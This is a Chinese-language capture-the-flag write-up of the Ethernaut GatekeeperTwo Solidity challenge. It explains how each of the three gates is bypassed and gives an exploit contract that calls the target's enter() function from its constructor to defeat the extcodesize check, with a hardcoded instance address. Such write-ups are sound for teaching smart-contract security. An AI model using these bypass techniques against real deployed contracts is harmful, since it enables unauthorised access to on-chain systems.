## 0x01 Task

```javascript
pragma solidity ^0.4.18;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(keccak256(msg.sender)) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

## 0x02 Solution

`gateOne()`白给

`gateThree()`

`_gateKey = (bytes8)(uint64(keccak256(address(this))) ^ (uint64(0) - 1))`

比较有技巧性的是 `gateTwo()` ，用了内联汇编的写法。

解释一下里面的名词：

> - `caller` : `Get caller address.`
> - `extcodesize` : `Get size of an account’s code.`

在执行初始化代码（构造函数），而新的区块还未添加到链上的时候，新的地址已经生成，然而代码区为空。此时，调用 `EXTCODESIZE()` 返回为 0

那么，只需要在第三方合约的构造函数中来调用题目合约中的 `enter()` 即可满足条件。

exp：

```javascript
pragma solidity ^0.4.18;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(keccak256(msg.sender)) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract Attack {

    address instance_address = 0xe8c0af8c1c656f5489f6bcc647361f4700cc5702;
    GatekeeperTwo target = GatekeeperTwo(instance_address);

    function Attack(){
        target.enter((bytes8)(uint64(keccak256(address(this))) ^ (uint64(0) - 1)));
    }

}
```

